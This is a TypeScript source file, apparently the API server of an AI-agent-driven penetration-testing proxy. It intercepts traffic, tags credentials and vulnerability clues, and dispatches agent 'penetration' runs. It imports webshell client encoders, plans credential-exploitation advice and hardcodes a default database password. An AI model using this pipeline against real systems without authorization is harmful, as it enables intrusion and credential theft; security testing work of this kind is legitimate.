/**
 * HermesPentBox HTTP API + SSE 事件流
 * 传统接口层：Hermes 可直接 curl / HTTP 消费，不依赖 MCP
 *
 * GET  /api/status          引擎状态（代理端口/上游/统计）
 * GET  /api/flows?limit=&after=   流量列表（after=增量拉取）
 * GET  /api/flows/:id       单条流量
 * PUT  /api/upstream        设置上游代理 {type,host,port,username?,password?}
 * GET  /api/events          SSE 实时流量事件流
 * POST /api/proxy/stop      停代理
 * POST /api/proxy/restart   重启代理（换端口用 PUT /api/config）
 */
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http'
import crypto from 'node:crypto'
import { spawn } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { connect } from 'node:net'
import { SOUL_PERSONA, USER_PROFILE } from './persona.ts'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import WebSocket from 'ws'
import { decodeBody } from './mitm.ts'
import { Neo4jGraph } from './graph.ts'
import os from 'node:os'
import type { FlowMeta, ProxyEngine, Upstream } from './proxy.ts'
import type { ChromeBrowser } from './browser.ts'
import type { FirefoxBrowser } from './firefox.ts'
import type { SshSession } from './ssh.ts'
import { AgentBridgeClient } from './bridge.ts'
import zlib from 'node:zlib'
import { godzillaPhpEncode, godzillaPhpEncodeRaw, godzillaPhpDecode, godzillaPhpDecodeFull, godzillaSerializeParams, godzillaSerializeGzip, godzillaJspEncode, godzillaJspEncodeRaw, godzillaJspDecode, godzillaJspDecodeRaw, godzillaJspEncodeParams, godzillaCshapEncode, godzillaCshapEncodeRaw, godzillaCshapDecode, godzillaCshapDecodeRaw, behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode, antSwordPhpEncode, xorCrypt } from './webshell.ts'

// ---------------- HaENet 标签体系（5 组分类 + fixed level + 颜色；Agent 敏感提取按此输出 type，前端按此着色） ----------------
export type HaeGroup = 'Fingerprint' | 'Maybe Vulnerability' | 'Basic Information' | 'Sensitive Information' | 'Other'
export interface HaeTag { group: HaeGroup; cn: string; level: 'high' | 'medium' | 'low' | 'info'; color: string }
/** 标签注册表：type 名（LLM 输出）→ 分组/中文名/固定等级/颜色 */
export const HAE_TAGS: Record<string, HaeTag> = {
  // ---- Fingerprint（指纹识别，HaENet 原版） ----
  'Shiro': { group: 'Fingerprint', cn: 'Shiro 框架指纹', level: 'medium', color: '#66bb6a' },
  'JSON Web Token': { group: 'Fingerprint', cn: 'JWT 令牌指纹', level: 'medium', color: '#4fc3f7' },
  'Swagger UI': { group: 'Fingerprint', cn: 'Swagger 接口文档', level: 'medium', color: '#f76b6b' },
  'Ueditor': { group: 'Fingerprint', cn: 'Ueditor 编辑器指纹', level: 'medium', color: '#66bb6a' },
  'Druid': { group: 'Fingerprint', cn: 'Druid 监控面板', level: 'medium', color: '#f7a35c' },
  'PDF.js Viewer': { group: 'Fingerprint', cn: 'PDF.js 查看器', level: 'low', color: '#66bb6a' },
  'Vite DevMode': { group: 'Fingerprint', cn: 'Vite 开发模式', level: 'high', color: '#f76b6b' },
  // ---- Maybe Vulnerability（潜在漏洞线索，HaENet 原版） ----
  'Java Deserialization': { group: 'Maybe Vulnerability', cn: 'Java 反序列化入口', level: 'high', color: '#f7e05c' },
  'Debug Logic Parameters': { group: 'Maybe Vulnerability', cn: '调试/后门参数', level: 'medium', color: '#80cbc4' },
  'URL As A Value': { group: 'Maybe Vulnerability', cn: 'URL 作为参数值(SSRF)', level: 'medium', color: '#80cbc4' },
  'Upload Form': { group: 'Maybe Vulnerability', cn: '文件上传表单', level: 'medium', color: '#f7e05c' },
  'DoS Parameters': { group: 'Maybe Vulnerability', cn: 'DoS 类分页参数', level: 'low', color: '#80cbc4' },
  'Passwd File': { group: 'Maybe Vulnerability', cn: '口令文件泄漏', level: 'high', color: '#f76b6b' },
  'Win.ini File': { group: 'Maybe Vulnerability', cn: 'Windows 配置文件泄漏', level: 'high', color: '#f76b6b' },
  // ---- Basic Information（基础信息，HaENet 原版） ----
  'Email': { group: 'Basic Information', cn: '邮箱地址', level: 'low', color: '#ce93d8' },
  'Chinese IDCard': { group: 'Basic Information', cn: '中国大陆身份证', level: 'high', color: '#ffb74d' },
  'Chinese Mobile Number': { group: 'Basic Information', cn: '中国大陆手机号', level: 'medium', color: '#80cbc4' },
  'Internal IP Address': { group: 'Basic Information', cn: '内网 IP 地址', level: 'medium', color: '#80cbc4' },
  'MAC Address': { group: 'Basic Information', cn: 'MAC 地址', level: 'low', color: '#66bb6a' },
  // ---- Sensitive Information（敏感信息，HaENet 原版 + 兼容原凭据标签） ----
  'Cloud Key': { group: 'Sensitive Information', cn: '云厂商 AccessKey', level: 'high', color: '#f7e05c' },
  'Cloud Access Key': { group: 'Sensitive Information', cn: '云 AccessKey/Secret', level: 'high', color: '#f7e05c' },
  'Windows File/Dir Path': { group: 'Sensitive Information', cn: 'Windows 路径泄漏', level: 'medium', color: '#66bb6a' },
  'Password Field': { group: 'Sensitive Information', cn: '密码字段', level: 'high', color: '#f7a35c' },
  'Username Field': { group: 'Sensitive Information', cn: '用户名/账号字段', level: 'low', color: '#66bb6a' },
  'WeCom Key': { group: 'Sensitive Information', cn: '企业微信凭证', level: 'high', color: '#66bb6a' },
  'JDBC Connection': { group: 'Sensitive Information', cn: 'JDBC 数据库连接(明文口令)', level: 'high', color: '#f7e05c' },
  'Authorization Header': { group: 'Sensitive Information', cn: 'Authorization 认证头', level: 'high', color: '#4fc3f7' },
  'Sensitive Field': { group: 'Sensitive Information', cn: '敏感字段(key/secret/token)', level: 'medium', color: '#f7e05c' },
  'Mobile Number Field': { group: 'Sensitive Information', cn: '手机号字段', level: 'low', color: '#66bb6a' },
  'Userinfo In Link': { group: 'Sensitive Information', cn: 'URL 内嵌用户信息', level: 'medium', color: '#66bb6a' },
  'User Identity': { group: 'Sensitive Information', cn: '前端身份存储(localStorage)', level: 'medium', color: '#66bb6a' },
  // ---- 兼容原攻击凭据标签（归入 Sensitive Information 高等级） ----
  'API Key': { group: 'Sensitive Information', cn: 'API 密钥', level: 'high', color: '#f76b6b' },
  'Bearer Token': { group: 'Sensitive Information', cn: 'Bearer 令牌', level: 'high', color: '#4fc3f7' },
  'Password': { group: 'Sensitive Information', cn: '口令/密码', level: 'high', color: '#f7a35c' },
  'Secret': { group: 'Sensitive Information', cn: '密钥/机密', level: 'high', color: '#f7e05c' },
  'Token': { group: 'Sensitive Information', cn: '令牌', level: 'high', color: '#4fc3f7' },
  'Session Cookie': { group: 'Sensitive Information', cn: '会话 Cookie', level: 'high', color: '#b388ff' },
  'Private Key': { group: 'Sensitive Information', cn: '私钥', level: 'high', color: '#ef5350' },
  'Authorization': { group: 'Sensitive Information', cn: '认证凭据', level: 'high', color: '#4fc3f7' },
  // ---- Other（其他，HaENet 原版） ----
  'Linkfinder': { group: 'Other', cn: '链接发现', level: 'info', color: '#8b98a8' },
  'Source Map': { group: 'Other', cn: 'Source Map 源码映射', level: 'low', color: '#f48fb1' },
  'Create Script': { group: 'Other', cn: '动态创建脚本', level: 'low', color: '#66bb6a' },
  'URL Schemes': { group: 'Other', cn: '自定义 URL 协议', level: 'low', color: '#f7e05c' },
  'Router Push': { group: 'Other', cn: '前端路由跳转', level: 'info', color: '#ce93d8' },
  'All URL': { group: 'Other', cn: '链接引用', level: 'info', color: '#8b98a8' },
  '302 Location': { group: 'Other', cn: '302 重定向地址', level: 'info', color: '#8b98a8' },
  'OSKeys': { group: 'Other', cn: '系统标识泄漏', level: 'medium', color: '#8b98a8' },
  // ---- Nday 线索（保留原体系，归 Maybe Vulnerability 高等级） ----
  'Nday API': { group: 'Maybe Vulnerability', cn: 'Nday 漏洞 API 路径', level: 'high', color: '#ff5252' },
  'Nday JS': { group: 'Maybe Vulnerability', cn: 'Nday 可疑 JS 引用', level: 'high', color: '#ff7043' },
  'Nday 组件': { group: 'Maybe Vulnerability', cn: 'Nday 漏洞组件/版本', level: 'high', color: '#ff5252' },
}
/** 5 组中文名（prompt 分组说明用） */
export const HAE_GROUPS: { key: HaeGroup; cn: string }[] = [
  { key: 'Fingerprint', cn: '指纹识别' },
  { key: 'Maybe Vulnerability', cn: '潜在漏洞线索' },
  { key: 'Basic Information', cn: '基础信息' },
  { key: 'Sensitive Information', cn: '敏感信息' },
  { key: 'Other', cn: '其他' },
]
/** 凭据类标签（写 Cred 节点 + 自动凭据利用意见卡的判定集合） */
export const HAE_CRED_TAGS = new Set<string>([
  'API Key', 'Bearer Token', 'Password', 'Secret', 'Token', 'Session Cookie', 'Private Key', 'Authorization',
  'Cloud Key', 'Cloud Access Key', 'Password Field', 'WeCom Key', 'JDBC Connection', 'Authorization Header',
])
/** HAE 漏洞等级色（与前端 AN_LEVEL_COLOR 同源；入图：Vuln/Api/Analysis 节点颜色标识） */
export const HAE_LEVEL_COLOR: Record<string, string> = { high: '#f76b6b', medium: '#f7a35c', low: '#f7e05c', info: '#8b98a8' }
/** 渲染 HaENet 标签清单文本（注入分析 prompt） */
export function haeTagList(): string {
  const lines: string[] = []
  for (const g of HAE_GROUPS) {
    const tags = Object.entries(HAE_TAGS).filter(([, t]) => t.group === g.key)
    lines.push(`${g.cn}(${g.key})：${tags.map(([k]) => k).join(' / ')}`)
  }
  return lines.join('\n')
}

/** 漏洞记录（Agent CRUD + UI 展示） */
export interface Vuln {
  id: number
  name: string
  level: 'high' | 'medium' | 'low' | 'info'
  cvss: string
  uri: string
  desc: string
  exploit: string
  status: 'pending' | 'confirmed' | 'false'
  reqRaw: string
  resRaw: string
  ts: number
}

export interface ApiDeps {
  chrome?: ChromeBrowser
  firefox?: FirefoxBrowser
  ssh?: SshSession
}

export interface ApiServerOptions {
  port: number
  host?: string
  proxyPort?: number   // 代理引擎实际端口（status 展示用）
  flowCap?: number     // 内存环形缓冲上限
}

const CORS = {
  'access-control-allow-origin': '*',
  'access-control-allow-methods': 'GET,PUT,POST,OPTIONS',
  'access-control-allow-headers': 'content-type',
}

/**
 * 思考深度映射（参考 hermes parse_reasoning_effort + deepseek build_api_kwargs_extras）：
 * none/false/disabled/off → {enabled:false}；low/medium/high 透传；xhigh/max/ultra → max；空/未知 → null（走默认）
 */
export function parseReasoningEffort(effort?: string): { enabled: boolean; effort?: string } | null {
  const e = String(effort ?? '').trim().toLowerCase()
  if (!e) return null
  if (['none', 'false', 'disabled', 'off', 'no'].includes(e)) return { enabled: false }
  const norm = ['xhigh', 'max', 'ultra'].includes(e) ? 'max' : e
  if (!['low', 'medium', 'high', 'max'].includes(norm)) return null
  return { enabled: true, effort: norm }
}

/** 全局情报条目（结构化：多 Agent 战况共享；持久条目不淘汰，滚动条目 20 条窗口） */
interface DigestEntry {
  kind: 'vuln' | 'cred' | 'nday' | 'penetrating' | 'penetrated' | 'cancelled' | 'note'
  host: string
  path: string
  data: string
  persist: boolean
  /** HaENet 分析标签（模块/组/等级/颜色，随条目写入 Neo4j 图节点） */
  tag?: string
  group?: HaeGroup
  level?: 'high' | 'medium' | 'low' | 'info'
  color?: string
}

export class ApiServer {
  private server?: Server
  private flows: FlowMeta[] = []
  private flowDetails = new Map<number, { reqHeaders: Record<string, string>; reqBody: string; resHeaders: Record<string, string>; resBody: string; reqRawHeaders: string[]; resRawHeaders: string[]; reqLine: string; resLine: string }>()
  private wsFlows: { ts: number; direction: 'sent' | 'received'; payload: string; length: number }[] = []
  private sseClients = new Set<ServerResponse>()
  private readonly cap: number
  private readonly port: number
  private readonly host: string
  private readonly opts: ApiServerOptions

  constructor(
    private engine: ProxyEngine,
    private deps: ApiDeps = {},
    opts: ApiServerOptions,
  ) {
    this.opts = opts
    this.port = opts.port
    this.host = opts.host ?? '127.0.0.1'
    this.cap = opts.flowCap ?? 5000
  }

  async start(): Promise<void> {
    // Neo4j Agent 情报图（完全替代全局情报 digest）
    this.graph.connect()
    this.probeHermes()
    setInterval(() => this.probeHermes(), 5000)  // HERMES AGENT 状态实时探测
    this.loadVulns()
    this.loadWebshells()
    this.loadDownstream()
    void this.ensureHermesProfile()  // 自动确保 hermespentbox 独立档案（含 persona/用户画像）
    setTimeout(() => this.ensureSkills(), 3000)  // 档案就绪后确保内置红队技能库（102 技能）
    this.startAnalyzeLoop()
    this.server = createServer((req, res) => void this.handle(req, res))
    await new Promise<void>((resolve, reject) => {
      this.server!.once('error', reject)
      this.server!.listen(this.port, this.host, () => resolve())
    })
    // 引擎流量 → 内存缓冲 + SSE 广播
    this.engine.onFlow = (f) => this.push(f)
  }

  async stop(): Promise<void> {
    for (const c of this.sseClients) c.end()
    this.sseClients.clear()
    await new Promise<void>((resolve) => this.server?.close(() => resolve()))
    this.server = undefined
  }

  push(f: FlowMeta): void {
    // MITM 全量报文分离存储（不进列表/SSE，按需取）
    if (f.detail) {
      this.flowDetails.set(f.id, f.detail)
      if (this.flowDetails.size > 200) {
        const first = this.flowDetails.keys().next().value
        this.flowDetails.delete(first)
      }
      const { detail, ...meta } = f
      this.flows.push(meta)
    } else {
      this.flows.push(f)
    }
    if (this.flows.length > this.cap) this.flows.splice(0, this.flows.length - this.cap)
    // 所有 HTTP/HTTPS 流量自动入 Agent 分析队列（消息队列：FIFO 逐个消费；带完整报文快照）
    // 跳过审计：应用自身流量（WebShell/Repeater，self 标记）|| 渗透窗口（子 Agent 渗透期间的流量，防循环）
    if (!f.self && !this.penetrating && f.method !== 'WS') {
      this.enqueueAnalyze(f.id, f.detail, f.url)
    } else if (f.method !== 'WS' && f.id) {
      // 跳过的流量：analyzeMap 标记 done + skipped（流量表 Agent 列显示跳过 ICON），不入分析队列
      this.analyzeMap.set(f.id, { state: 'done', vuln: false, skipped: true, self: !!f.self, penetrate: !!f.self && this.penetrating, detail: f.detail, url: f.url })
    }
    const { detail: _d, ...meta } = f
    this.pushSse(meta)
  }

  /** SSE 广播（try/catch 容错：客户端断开后 write 会抛异常，不能让它拖垮主流程） */
  private pushSse(obj: unknown): void {
    const payload = `data: ${JSON.stringify(obj)}\n\n`
    for (const c of this.sseClients) { try { c.write(payload) } catch { /* 客户端已断开 */ } }
  }

  pushWs(f: { ts: number; direction: 'sent' | 'received'; payload: string; length: number }): void {
    this.wsFlows.push(f)
    if (this.wsFlows.length > 500) this.wsFlows.splice(0, this.wsFlows.length - 500)
  }

  private repSeq = 0

  // ---------------- Agent 分析队列（流量逐个入队，外部 Agent 消费 /api/analyze/next 并写回结果） ----------------
  private analyzeQueue: number[] = []
  private analyzeMap = new Map<number, { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string; level?: string }[]; skipped?: boolean; builtin?: boolean; self?: boolean; penetrate?: boolean; confirmed?: boolean; confLevel?: string }>()
  /** 全局情报 digest：所有槽分析结论/凭据/渗透状态/取消记录结构化汇总（注入每次分析 prompt——子 Agent 共享上下文，防记忆割裂） */
  private analysisDigest: DigestEntry[] = []
  /** Neo4j Agent 情报图（会话内容共享，替代 digest） */
  private graph = new Neo4jGraph(process.env.NEO4J_URL || 'bolt://localhost:7687', process.env.NEO4J_USER || 'neo4j', process.env.NEO4J_PASS || 'pentbox123')
  /** 站点地图→图已同步的 URL 去重（防重复 MERGE 调用；Neo4j 侧幂等，此集仅控调用量） */
  private graphApiSynced = new Set<string>()
  /** 已推送意见卡的去重 key（无协议 Host+路径+查询 | 渗透方式）：同 URL 同方式不再重复推送；不同方式可再推（与"不同方式可再渗"一致） */
  private advisedKeys = new Set<string>()
  /** 已渗透成功的 URL+渗透方式（渗透成果去重：同 API 同方式不再重复渗透；不同方式可再渗） */
  private penetratedKeys = new Set<string>()
  /** 进行中的渗透 key（URL+渗透方式，统一 key 格式）：防同一 URL 同方式并发双渗透/双卡 */
  private penetratingKeys = new Set<string>()
  /** 进行中渗透的目标（slot → "Host+路径 方式"，供取消时写入全局情报） */
  private penetrateTargets = new Map<number, string>()
  /** 已提出渗透意见卡、等待用户决策的子 Agent 槽位（暂停该槽流量分析；用户点渗透/取消/卡片关闭后恢复） */
  private pendingAdviceSlots = new Set<number>()
  /** 本地 hermes gateway 进程（渗透经 gateway 执行：取消走 WebSocket abort 信号，参考 hermes-studio chat-run 实现） */
  private gatewayProc: ReturnType<typeof spawn> | null = null

  // ---------------- Agent Bridge（主 Agent 对话 + 运行中引导 steer；参考 hermes-studio agent-bridge） ----------------
  /** 本应用专用 bridge 端口（独立于桌面 backend 的 18765，避免冲突） */
  private readonly bridgePort = 28766
  /** bridge broker 进程 */
  private bridgeProc: ReturnType<typeof spawn> | null = null
  /** bridge 就绪标记（TCP 可连 = 就绪） */
  private bridgeReady = false
  /** bridge 客户端 */
  private bridge = new AgentBridgeClient({ host: '127.0.0.1', port: this.bridgePort })

  /** 确保本地 Agent Bridge broker 运行（hermes-studio 的 hermes_bridge.py；TCP line-protocol，独立端口）
   * bridge 未启动时 spawn python hermes_bridge.py；就绪后 bridge 可调 action:chat/steer/get_output */
  private ensureBridge(): Promise<void> {
    if (this.bridgeReady) return Promise.resolve()
    return new Promise((resolve) => {
      const probe = () => {
        this.bridge.ping()
          .then(() => { this.bridgeReady = true; resolve() })
          .catch(() => {
            if (!this.bridgeProc) {
              // 用 hermes-agent 的 venv python 启动本应用自带的 Agent Bridge（core/pentbox_bridge.py）
              const py = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'python.exe')
              // 优先环境变量指定，否则用应用自带脚本（部署/开发目录）
              const candidates = [
                process.env.PENTBOX_BRIDGE_SCRIPT,
                join(process.cwd(), 'core', 'pentbox_bridge.py'),
                join(__dirname, '..', 'core', 'pentbox_bridge.py'),
              ]
              const found = candidates.find((p) => p && existsSync(p))
              if (!found) { console.warn('[pentbox] pentbox_bridge.py 未找到，steer/对话桥接不可用'); resolve(); return }
              console.log('[pentbox] 启动 Agent Bridge broker…', found)
              this.bridgeProc = spawn(py, [found, '--port', String(this.bridgePort), '--hermes-home', this.hermesHome], {
                env: { ...process.env, HERMES_HOME: this.hermesHome, HERMES_AGENT_ROOT: join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent'), PENTBOX_BRIDGE_LOG: join(process.cwd(), 'core', 'pentbox_bridge.log') }, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true,
              })
              this.bridgeProc.on('exit', () => { this.bridgeProc = null; this.bridgeReady = false })
              this.bridgeProc.unref()
            }
            // 轮询直到可连（broker 启动约 2-5s）
            const t0 = Date.now()
            const iv = setInterval(() => {
              this.bridge.ping()
                .then(() => { clearInterval(iv); this.bridgeReady = true; resolve() })
                .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 启动超时'); resolve() } })
            }, 1000)
          })
      }
      probe()
    })
  }

  /** 确保本地 gateway 运行（127.0.0.1:8642 探测；未运行则 spawn hermes gateway run 后台） */
  private ensureGateway(): Promise<void> {
    const net = require('node:net') as typeof import('node:net')
    return new Promise((resolve) => {
      const probe = net.connect(8642, '127.0.0.1')
      probe.on('connect', () => { probe.destroy(); resolve() })
      probe.on('error', () => {
        probe.destroy()
        if (!this.gatewayProc) {
          this.gatewayProc = spawn(this.hermesCli, ['gateway', 'run'], { env: this.hermesEnv, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true })
          this.gatewayProc.on('exit', () => { this.gatewayProc = null })  // 进程退出即重置引用（下次渗透可重新拉起）
          this.gatewayProc.unref()
        }
        const t0 = Date.now()
        const iv = setInterval(() => {
          const p = net.connect(8642, '127.0.0.1')
          p.on('connect', () => { p.destroy(); clearInterval(iv); resolve() })
          p.on('error', () => { p.destroy(); if (Date.now() - t0 > 20000) { clearInterval(iv); resolve() } })
        }, 1000)
      })
    })
  }

  /** 渗透经本地 Agent Bridge 执行（与主对话/分析同通道，会话可 steer；取消 = bridge interrupt） */
  private runViaGateway(input: string, sessionId: string | null, onChild?: (stop: () => void) => void): Promise<string> {
    return this.bridgeAsk(input, sessionId, {
      onAbort: (stop) => onChild?.(stop),
    })
  }

  /** 主 Agent 对话经本地 Agent Bridge 执行（参考 hermes-studio agent-bridge）：
   * action:chat 启动会话（session_id 持久，跨轮续传）→ get_output 轮询流式输出（delta 增量）
   * 运行中可调 action:steer 注入引导（不打断当前 turn）；onEvent 回调：delta 流式 / done 收尾 / error
   * onAbort 回调：供前端中断（interrupt 优雅停止，保留会话历史） */
  private chatViaGateway(input: string, sessionId: string | null, onEvent: (ev: { type: 'delta' | 'done' | 'error' | 'tool' | 'sid'; text?: string; reply?: string; error?: string; sessionId?: string; tool?: string; preview?: string; evType?: string }) => void, onAbort?: (stop: () => void) => void): Promise<string> {
    return this.bridgeAsk(input, sessionId, {
      onDelta: (t) => onEvent({ type: 'delta', text: t }),
      onSid: (sid) => onEvent({ type: 'sid', sessionId: sid }),
      onTool: (ev) => onEvent({ type: 'tool', evType: ev.type, tool: ev.tool, preview: ev.preview }),
      onDone: (sid, reply) => onEvent({ type: 'done', reply, sessionId: sid }),
      onError: (msg) => onEvent({ type: 'error', error: msg }),
      onAbort,
    }, true)
  }

  /** 通用 Agent Bridge 单轮对话（分析/渗透/沟通/主对话共用）：
   * 无会话则新建（persist）；有则续传。返回完整回复文本。 */
  private bridgeAsk(input: string, sessionId: string | null, opts: { onDelta?: (t: string) => void; onDone?: (sid: string, reply: string) => void; onSid?: (sid: string) => void; onTool?: (ev: { type: string; tool: string; preview: string }) => void; onError?: (msg: string) => void; onAbort?: (stop: () => void) => void } = {}, mainChat = false): Promise<string> {
    return new Promise((resolve, reject) => {
      this.ensureBridge().then(async () => {
        try {
          if (!this.bridgeReady) return reject(new Error('Agent Bridge 未就绪'))
          // 无会话 → 新建 bridge 会话（persist）
          // 仅主 Agent 聊天（mainChat）允许回写 chatSessionId——流量分析/渗透的会话不得污染主会话指针
          let sid = sessionId
          if (!sid) {
            sid = `pentbox-chat-${Date.now()}`
            if (mainChat) this.chatSessionId = sid
          }
          opts.onSid?.(sid)  // 尽早通知会话 id（前端运行中 steer 需要）
          const started = await this.bridge.chat(sid, input, 'hermespentbox')
          if (!started?.ok) return reject(new Error('bridge 对话启动失败'))
          // 会话已在运行（并发/串话）：等待当前 run 完成后自动续发（同 session 串行），避免丢失消息
          if (started.status === 'already_running') {
            // 轮询上一次 run 直到 done（上限 180s，防止上一 run 卡死导致本消息永久挂起）
            const prevRun = started.run_id
            const deadline = Date.now() + 180_000
            await new Promise<void>((res) => {
              const iv = setInterval(async () => {
                try {
                  const o = await this.bridge.getOutput(prevRun, 0, 0)
                  if (o.done || Date.now() > deadline) { clearInterval(iv); res() }
                } catch { clearInterval(iv); res() }
              }, 300)
            })
            return this.bridgeAsk(input, sid, opts)  // 递归：上一轮完成后重发本条
          }
          const runId = started.run_id
          let out = ''
          let finished = false
          let cursor = 0
          let eventCursor = 0
          let lastToolCount = 0
          // 整体超时兜底：模型 API 卡死/极慢（如 minimax IndexError+38s latency）时自动中断 run 并失败，
          // 避免分析槽/前端状态永久"分析中"（broker 端还有 240s watchdog 双保险）
          const timer = setTimeout(() => {
            if (!finished) {
              this.bridge.interrupt(sid, undefined, 'hermespentbox').catch(() => {})
              finish(new Error(`Agent 响应超时（180s），已自动中断`))
            }
          }, 180_000)
          const finish = (err?: Error) => { if (finished) return; finished = true; clearTimeout(timer); err ? reject(err) : resolve(out) }
          opts.onAbort?.(() => { this.bridge.interrupt(sid, undefined, 'hermespentbox').catch(() => {}); setTimeout(finish, 1500) })
          // 轮询 get_output（100ms 间隔）直到 done；delta 增量 + 工具进度转发
          const pump = async () => {
            while (!finished) {
              let chunk
              try { chunk = await this.bridge.getOutput(runId, cursor, eventCursor) } catch (e) { finish(new Error(`bridge 输出轮询失败：${(e as Error).message}`)); return }
              if (!chunk?.ok) { finish(new Error('bridge get_output 失败')); return }
              cursor = chunk.cursor ?? cursor
              eventCursor = chunk.event_cursor ?? eventCursor
              // 工具进度事件（新到才转发）
              if (opts.onTool && Array.isArray(chunk.tool_events) && chunk.tool_events.length > lastToolCount) {
                for (const ev of chunk.tool_events.slice(lastToolCount)) opts.onTool(ev)
                lastToolCount = chunk.tool_events.length
              }
              if (chunk.delta) { out += chunk.delta; opts.onDelta?.(chunk.delta) }
              if (chunk.status === 'error' || chunk.error) { opts.onError?.(chunk.error || 'run error'); finish(new Error(chunk.error || 'run error')); return }
              if (chunk.done) {
                if (chunk.output) out = chunk.output
                opts.onDone?.(sid, out)
                finish()
                return
              }
              await new Promise((r) => setTimeout(r, 120))
            }
          }
          pump()
        } catch (e) {
          reject(e)
        }
      }).catch(reject)
    })
  }

  /** 新流量入分析队列（消息队列：FIFO，逐个消费；入队即快照完整请求/响应报文） */
  private enqueueAnalyze(id: number, detail?: unknown, url?: string): void {
    if (this.analyzeMap.has(id)) return
    // HermesPentBox 自身产生的流量（WebShell / Repeater 等带 x-pentbox-source 标记）：直接跳过 Agent 审计（done + 跳过 icon）
    if (this.isPentboxOwnTraffic(detail)) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
      return
    }
    // 浏览器自带流量（更新/字典/遥测/OCSP）：不送 Agent 直接 done（跳过 icon），不占 Hermes 队列
    if (this.isBrowserBuiltin(detail, url)) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
      return
    }
    // 错误状态码：404（资源不存在）与 5xx（服务器错误）无 bypass 价值 → 跳过 Agent（done + 跳过 icon）
    // 401/403/407 等 40x 保留（可做 bypass 分析，必须发 Agent）
    // st===0（连接失败/无响应报文，如 CONNECT 隧道、代理 502 错误）：无响应内容可分析 → 同样跳过
    const st = this.resStatus(detail)
    if (st === 0 || st === 404 || st >= 500) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, detail })
      return
    }
    // 渗透执行窗口内的流量：子 Agent 自己的渗透请求 → 直接跳过（不再用子 Agent 审计，防循环）
    // 判定：渗透窗口（penetrating）|| 流量目标命中进行中渗透的目标（Host+路径，防渗透前已排队/窗口边缘的漏网流量）
    const inPenetrate = this.penetrating || (() => {
      const u = url || ''
      for (const t of this.penetrateTargets.values()) {
        const key = (t || '').split(' ')[0]
        if (key && u.includes(key)) return true
      }
      return false
    })()
    if (inPenetrate) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, penetrate: true, detail, url })
      return
    }
    this.analyzeMap.set(id, { state: 'queued', detail, url })
    this.analyzeQueue.push(id)
    // 站点地图同步到 Neo4j：进入审计的流量（非 builtin/self/404/5xx/渗透）≡ 站点地图可见项 → 写 Host-Api 节点（图上下文供 Agent 直接看到站点地图）
    if (url && !this.graphApiSynced?.has(url)) {
      const d = detail as { reqLine?: string } | undefined
      const line = String(d?.reqLine || '')
      const m = line.match(/^(\S+)\s+(\S+)/)
      const host = this.hostOf(url) || url  // 统一无协议 host:port（与分析/凭据/漏洞写入同格式，避免 Host 节点分裂）
      let path = m ? m[2] : ''
      // 代理请求行可能是绝对 URI（curl/浏览器走代理：GET http://host/path HTTP/1.1）→ 归一为相对路径
      if (path.startsWith('http')) { try { const pu = new URL(path); path = pu.pathname + pu.search } catch { /* 保持原样 */ } }
      if (!path) path = url.replace(/^https?:\/\/[^/]+/i, '') || '/'
      const method = m ? m[1] : 'GET'
      // 仅写入成功才标记已同步（失败不标记 → 后续同 URL 流量自动重试；避免 Neo4j 抖动导致站点地图条目永久丢失）
      this.graph.upsertHostApi(host, path, method)
        .then(() => {
          if (this.graphApiSynced.size > 5000) this.graphApiSynced.clear()  // 防无限增长（重启即清，Neo4j 侧 MERGE 幂等）
          this.graphApiSynced.add(url)
        })
        .catch(() => { /* 图写入失败：不标记，下次同 URL 流量再试 */ })
    }
  }

  /** 从报文快照解析响应状态码（resLine 形如 HTTP/1.1 404 Not Found） */
  private resStatus(detail?: unknown): number {
    const d = detail as { resLine?: string } | undefined
    const m = String(d?.resLine ?? '').match(/HTTP\/[\d.]+\s+(\d{3})/)
    return m ? Number(m[1]) : 0
  }

  /** 浏览器内置流量特征：Chrome/Edge/Firefox 更新、字典、时间同步、遥测、OCSP 证书状态等（旧实例日志实证样本） */
  private static readonly BROWSER_TRAFFIC = [
    /redirector\.gvt1\.com/,            // Chrome 字典/组件下载
    /edgedl\/chrome\/dict/,             // Chrome 拼写字典
    /clients\d*\.google\.com/,          // Chrome 时间同步/遥测
    /update\.googleapis\.com/,          // Chrome 更新服务
    /service\/update2\/json/,           // Chrome 更新轮询
    /\/time\/1\/current/,               // Google 时间同步
    /tools\.google\.com\/service\/update/, // 更新清单
    /safebrowsing\.googleapis\.com/,    // 安全浏览
    /accounts\.google\.com\/ListAccounts/,  // Chrome 账户轮询
    /content-autofill\.googleapis\.com/,    // Chrome 自动填充
    /connectivitycheck\.gstatic\.com/,  // 网络连通性探测
    /\/generate_204\//,                 // 连通性 204 探针
    /clientservices\.google\.com/,      // Chrome 遥测
    /accounts\.google\.com\/domainreliability/,  // 账户域可靠性上传
    /www\.google\.com\/async\//,                 // 首页异步功能（folae 等）
    /www\.google\.com\/complete\/search/,        // 地址栏自动补全（omnibox suggestions：client=chrome-omni 等）
    /ohttp_gateway/,                             // gstatic OHTTP 网关（隐私代理）
    /gvt1-cn\.com/,                              // 字典 CDN 镜像（sn-*.gvt1-cn.com）
    /update\.googleapis\.com/,                   // Chrome 组件更新服务
    /www\.googleapis\.com/,                      // Google API 遥测（chromewebstore verify 等）
    /chromewebstore\.googleapis\.com/,           // 扩展商店
    /android\.clients\.google\.com/,             // Chrome checkin
    /optimizationguide-pa\.googleapis\.com/,     // 优化指南模型
    /clientservices\.googleapis\.com/,           // uma 遥测
    /beacons\.gcp\.gvt2\.com/,                   // 域可靠性上传
    /ocsp\.(digicert|comodoca|pki\.goog|usertrust|globalsign)\./,  // OCSP 证书吊销检查
